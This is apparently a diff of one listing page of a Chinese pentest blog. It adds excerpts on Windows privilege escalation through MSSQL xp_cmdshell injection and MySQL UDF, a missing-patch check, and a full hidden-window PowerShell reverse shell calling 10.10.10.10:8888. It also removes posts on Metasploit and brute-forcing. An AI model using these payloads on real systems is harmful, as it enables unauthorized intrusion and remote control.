@@ -66,184 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="https://wyb0.com/posts/2016/ubuntu-install-metasploit/">Ubuntu下安装Metasploit</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-18
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/tools">tools</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 安装Metasploit  下载msfinstall脚本
-$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall  修改文件权限
-$ chmod 755 msfinstall  安装(可能时间较久)
-$ ./msfinstall  更新exp
-$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
-$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
-$ msfdb init  运行msfconsole
-$ msfconsole  在msf中查看数据库连接状态
-msf &gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &gt; db_rebuild_cache   0x02 Metasploit Cheat Sheet 常见命令可以看下 https://www.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/ubuntu-install-metasploit/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/python-parames-parse/">Python 命令行参数解析</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-16
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/python">Python</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/python">python</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/module">module</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 argparse 模块 参考 https://docs.python.org/zh-cn/3.7/library/argparse.html
-#!/usr/bin/env python # -*- coding: utf-8 -*- import argparse class Parser(object): &quot;&quot;&quot;Parser&quot;&quot;&quot; def __init__(self): super(Parser, self).__init__() self.service_type_list = [ &quot;ssh&quot;,&quot;telnet&quot;,&quot;ftp&quot;, &quot;mysql&quot;,&quot;mssql&quot;,&quot;oracle&quot;,&quot;pgsql&quot;,&quot;redis&quot; ] self.log_level = [&quot;debug&quot;, &quot;info&quot;, &quot;warning&quot;, &quot;error&quot;, &quot;critical&quot;] self.example = &quot;&quot;&quot;Example: \r python3 {} -s ssh -i 123.123.123.123 \r python3 {} -s ssh -i 123.123.123.123/24 -l root -p 123456&quot;&quot;&quot; def parser(self): parser = argparse.ArgumentParser( formatter_class=argparse.RawDescriptionHelpFormatter,#使 example 可以换行 add_help=True, # description = &quot;常见服务口令爆破&quot;, ) parser.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/python-parames-parse/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/">BurpSuite抓手机包</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2016-08-13
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/tools">tools</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包  挂burpsuite的代理下载证书  把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书
-安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装  抓https数据包   
-    </p>
-
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/">Linux下虚拟主机搭建多站点</a></h2>
 
         
@@ -640,6 +462,181 @@ yum install httpd  安装MySQL
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/">Windows下第三方服务提权</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-08-07
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
+提权条件：数据库账号是DBA权限
+ 关于xp_cmdshell
+ 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell 'net user'; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell 'net user';--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
+提权条件：MySQL是system权限
+ 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
+ UDF提权过程
+ 导入udf.dll到服务器指定目录
+ MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
+ MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
+CREATE FUNCTION shell RETURNS STRING SONAME &lsquo;udf.dll&rsquo;; 执行MySQL语句调用新创建的函数
+select shell(&lsquo;cmd&rsquo;,&lsquo;whoami&rsquo;); 删除创建的函数
+drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/">Windows下系统漏洞提权</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-08-07
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+         提权是在已经getshell但是权限不大的前提下做的
+0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
+systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &quot;%i&quot;||@echo %i Not Installed!)&amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 
+    </p>
+
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="https://wyb0.com/posts/2016/reverse-shell/">反弹shell小结</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2016-08-06
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E5%8F%8D%E5%BC%B9shell">反弹shell</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
+0x00 PowerShell #更换ip和端口即可 本地：nc -lv 8888 目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.10.10.10';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/reverse-shell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
 
             
 
@@ -651,7 +648,7 @@ yum install httpd  安装MySQL
             <a href="/page/8/"><i class="fa fa-chevron-left"></i></a>
         
 
-        <span>&nbsp;9 / 19&nbsp;</span>
+        <span>&nbsp;9 / 18&nbsp;</span>
         
         
             <a href="/page/10/"><i class="fa fa-chevron-right"></i></a>
@@ -677,7 +674,7 @@ yum install httpd  安装MySQL
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/git" title="git">git(6)</a>
+                <a href="https://wyb0.com/topics/git" title="git">git(4)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -687,7 +684,7 @@ yum install httpd  安装MySQL
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/linux" title="linux">linux(26)</a>
+                <a href="https://wyb0.com/topics/linux" title="linux">linux(25)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -697,7 +694,7 @@ yum install httpd  安装MySQL
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(83)</a>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -707,7 +704,7 @@ yum install httpd  安装MySQL
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/python" title="python">python(32)</a>
+                <a href="https://wyb0.com/topics/python" title="python">python(28)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -717,7 +714,7 @@ yum install httpd  安装MySQL
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/windows" title="windows">windows(4)</a>
+                <a href="https://wyb0.com/topics/windows" title="windows">windows(2)</a>
             </li>
         
     </ul>
@@ -794,7 +791,7 @@ yum install httpd  安装MySQL
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/git" title="git">git</a>
-                <sup>6</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -819,7 +816,7 @@ yum install httpd  安装MySQL
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
-                <sup>11</sup>
+                <sup>10</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -874,7 +871,7 @@ yum install httpd  安装MySQL
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/python" title="python">python</a>
-                <sup>30</sup>
+                <sup>26</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -920,11 +917,6 @@ yum install httpd  安装MySQL
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
                 <sup>11</sup>
-            </p>
-        
-            <p style="display:inline-block;">
-                <a href="https://wyb0.com/tags/tornado" title="tornado">tornado</a>
-                <sup>1</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -1014,7 +1006,7 @@ yum install httpd  安装MySQL
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
-                <sup>2</sup>
+                <sup>1</sup>
             </p>
         
     </div>
